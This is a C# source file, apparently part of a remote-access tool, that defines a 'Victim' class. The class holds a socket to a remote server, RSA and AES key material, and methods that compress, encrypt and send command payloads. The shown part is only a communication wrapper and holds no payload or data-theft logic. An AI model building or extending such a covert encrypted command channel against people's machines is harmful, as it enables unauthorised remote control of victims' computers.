using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace winClient48
{
    public class Victim
    {
        public Socket socket;
        public static int MAX_BUFFER_LENGTH = 65536;
        public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
        public string server_ip;
        public int server_port;

        //CRYPTOGRAPHY
        public (string public_key, string private_key) key_pairs;
        public (byte[] key, byte[] iv) _AES;

        byte[] Compress(byte[] buffer)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (GZipStream gzip = new GZipStream(ms, CompressionMode.Compress))
                {
                    gzip.Write(buffer, 0, buffer.Length);
                }
                return ms.ToArray();
            }
        }
        public Victim(Socket socket)
        {
            this.socket = socket;
        }

        public void Send(int cmd, int param, byte[] msg)
        {
            if (msg != null)
            {
                byte[] buffer = new DSP((byte)cmd, (byte)param, msg).GetBytes();
                //buffer = Compress(buffer);
                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.Partial, new AsyncCallback((ar) =>
                {
                    try
                    {
                        socket.EndSend(ar);
                    }
                    catch (Exception ex)
                    {

                    }
                }), buffer);
            }
        }
        public void Send(int cmd, int param, string msg)
        {
            Send(cmd, param, Encoding.UTF8.GetBytes(msg));
        }
        public void encSend(int cmd, int param, string data, SendMode mode = SendMode.RAW)
        {
            string enc_data = Crypto.AESEncrypt(data, _AES.key, _AES.iv);
            Send(cmd, param, enc_data);
        }
        public void SendCommand(string payload, SendMode mode = SendMode.RAW)
        {
            encSend(2, 0, payload);
        }
    }
}
